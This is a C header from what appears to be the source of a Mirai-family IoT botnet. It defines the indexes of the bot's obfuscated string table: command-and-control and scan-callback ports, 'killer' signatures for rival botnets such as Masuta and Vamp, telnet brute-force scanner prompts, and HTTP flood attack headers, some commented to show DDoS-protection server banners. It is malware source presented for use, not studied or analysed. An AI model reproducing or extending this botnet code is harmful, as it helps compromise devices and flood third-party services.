#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

// Connection Info
#define TABLE_CNC_PORT                  2
#define TABLE_SCAN_CB_PORT   			4
// Exec MSG
#define TABLE_EXEC_SUCCESS              5
// Killer Strings
#define TABLE_KILLER_PROC				6
#define TABLE_KILLER_EXE				7
#define TABLE_KILLER_FD					8
#define TABLE_KILLER_TCP				9
#define TABLE_KILLER_MAPS				10
#define TABLE_KILLER_STATUS				11
#define TABLE_KILLER_ANIME				12
#define TABLE_MEM_ROUTE					13
#define TABLE_MEM_CPUINFO				14
#define TABLE_MEM_BOGO					15
#define TABLE_MEM_RC					16
#define TABLE_MEM_MASUTA1				17
#define TABLE_MEM_MASUTA2				18
#define TABLE_MEM_MIRAI1				19
#define TABLE_MEM_MIRAI2				20
#define TABLE_MEM_VAMP1 				21
#define TABLE_MEM_VAMP2	   	   	    	22
#define TABLE_MEM_VAMP3	  	  	  	    23
//Scanner
#define TABLE_SCAN_SHELL				24
#define TABLE_SCAN_ENABLE				25
#define TABLE_SCAN_SYSTEM				26
#define TABLE_SCAN_SH					27
#define TABLE_SCAN_QUERY				28
#define TABLE_SCAN_RESP					29
#define TABLE_SCAN_NCORRECT				30
#define TABLE_SCAN_ASSWORD				31
#define TABLE_SCAN_OGIN					32
#define TABLE_SCAN_ENTER				33
#define TABLE_SCAN_PS					34
#define TABLE_SCAN_KILL_9				35
//Attack Strings
#define TABLE_ATK_VSE					36
#define TABLE_ATK_RESOLVER				37
#define TABLE_ATK_NSERV					38
#define TABLE_ATK_KEEP_ALIVE            39  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                40  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            41  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          42  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            43  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           44  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          45  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        46  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    47  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 48  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               49  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        50  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        51  // "connection:"
#define TABLE_ATK_DOSARREST             52  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      53  // "server: cloudflare-nginx"
#define TABLE_HTTP_ONE                  54
#define TABLE_HTTP_TWO                  55
#define TABLE_HTTP_THREE                56
#define TABLE_HTTP_FOUR                 57 
#define TABLE_HTTP_FIVE                 58

//MISC SHIT
#define TABLE_MISC_WATCHDOG				59
#define TABLE_MISC_WATCHDOG2			60
#define TABLE_MISC_RAND					61
#define TABLE_MISC_DVRHELP				62


#define TABLE_MAX_KEYS  63 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
